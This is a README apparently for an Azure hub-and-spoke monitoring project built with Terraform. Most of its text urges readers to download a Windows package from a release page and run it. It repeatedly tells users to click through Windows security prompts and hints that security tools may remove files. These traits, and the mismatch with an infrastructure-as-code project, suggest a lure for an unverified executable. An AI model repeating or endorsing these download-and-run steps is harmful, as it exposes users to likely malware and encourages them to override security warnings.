# 🧭 azure-monitoring-hub - Azure monitoring hub for clear control

[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/margareteillfitting284/azure-monitoring-hub/releases)

## 📥 Download

Visit this page to download: https://github.com/margareteillfitting284/azure-monitoring-hub/releases

Choose the latest release and download the file that matches your Windows system. If you see more than one file, pick the one meant for Windows. After the download finishes, open the file and follow the steps on screen.

## 🖥️ What this app does

azure-monitoring-hub helps set up an Azure hub-and-spoke network with monitoring in place. It is built for people who want a clean Azure setup with traffic control, logging, and alerts.

It includes:

- Hub-spoke network layout
- Internal load balancer support
- Bastion access for safe remote sign-in
- NAT Gateway for outbound access
- Network security groups for traffic rules
- Log Analytics for logs and data review
- Azure Monitor Agent support
- Data collection rules
- CPU alerts for key systems

## ✅ What you need

Before you start, make sure you have:

- A Windows PC
- A web browser
- A Microsoft Azure account
- Permission to create resources in Azure
- Enough free Azure quota for virtual networks, monitoring, and related services

For the best experience, use a current version of Windows and keep your browser up to date.

## 🚀 Get started

1. Open the release page link above.
2. Find the newest release.
3. Download the Windows package from that release.
4. Save the file to a folder you can find again, like Downloads or Desktop.
5. Open the downloaded file.
6. Follow the on-screen prompts.
7. If Windows asks for approval, choose the option to continue.
8. When setup ends, open the app or follow the included Azure deployment steps.

## 🧰 Before you run it

This project uses Terraform-based infrastructure for Azure. That means it is meant to help create cloud resources in a repeatable way.

You may need:

- A browser session signed in to Azure
- A subscription selected in the Azure portal
- Basic access to create resource groups, networks, and monitoring resources

If the release includes files such as scripts, templates, or config files, keep them together in the same folder. This makes setup easier to follow.

## 📂 Typical file layout

A release may include files like these:

- `README.md` with setup steps
- `main.tf` for Terraform config
- `variables.tf` for input values
- `outputs.tf` for results after deployment
- `scripts/` with helper files
- `modules/` for shared infrastructure parts
- `*.ps1` or `*.sh` files for setup tasks

If you see these names, leave them in place. They work together during deployment.

## 🧱 What gets deployed

The hub-spoke setup usually creates:

- A hub network in Azure
- One or more spoke networks
- Routing between parts of the network
- Bastion for browser-based access to virtual machines
- NAT Gateway for outbound internet traffic
- Network security rules
- Log Analytics workspace
- Azure Monitor Agent on target machines
- Data Collection Rules for log and metric flow
- CPU alerts for resource monitoring

This setup helps keep the network organized and easier to watch.

## 🔧 How to use it

After you download and open the release files:

1. Read any included setup file first.
2. Sign in to Azure if the steps ask for it.
3. Review the values for your Azure subscription, region, and resource names.
4. Apply the Terraform plan if the release includes Terraform files.
5. Wait for Azure to finish creating the resources.
6. Open Azure Portal and check the new hub and spoke resources.
7. Review logs in Log Analytics.
8. Check alert rules for CPU monitoring.

## 🔐 Network and monitoring features

This project focuses on two main parts: safe network design and clear monitoring.

### Network control

- Use Bastion to reach machines without exposing them directly
- Use NSGs to control allowed traffic
- Use a hub-spoke layout to separate shared and app networks
- Use NAT Gateway for controlled outbound access

### Monitoring

- Send machine data to Log Analytics
- Use AMA to collect telemetry
- Use DCRs to define what data gets sent
- Set CPU alerts to catch load issues early

## 🪟 Windows setup steps

If the release gives you a Windows file:

1. Download the file from the release page.
2. Open File Explorer.
3. Go to the folder where the file was saved.
4. Right-click the file if Windows asks for more options.
5. Choose Open or Run.
6. If a security prompt appears, choose the option to continue.
7. Follow the setup steps until they finish.
8. Keep the release folder in place if the app needs files from it later.

If the download is a zip file, extract it first, then open the extracted folder and continue.

## 🧭 After first run

After setup, check these items:

- The Azure resources exist in your subscription
- The hub and spoke networks show up in the portal
- Bastion is ready if you need remote access
- Log Analytics is receiving data
- Alerts are enabled for CPU usage
- Network rules match your needs

If anything looks wrong, open the release notes or included scripts and repeat the setup steps with the same values.

## 🗂️ Useful topics in this repo

This repository centers on:

- Azure
- Azure Monitor
- Bastion
- DevOps
- Hub-spoke design
- Infrastructure as code
- Monitoring
- Scripts
- Terraform

These topics point to a cloud setup that is meant to be repeatable and easy to manage.

## 🛠️ Common setup checks

If the app or deployment does not behave as expected, check these items:

- You are signed in to the correct Azure account
- Your Azure subscription is active
- You have permission to create resources
- The release files are fully downloaded
- No files were moved out of the folder
- Your browser did not block the download
- Your local security tools did not remove any files

## 📌 Release page

Use this page to get the latest files:

https://github.com/margareteillfitting284/azure-monitoring-hub/releases

Open the newest release, download the Windows package, and run it on your PC

## 🧩 What to expect next

After you complete the download and setup, you should have an Azure hub-spoke foundation with monitoring in place. From there, you can review logs, tune alerts, and adjust network rules to fit your environment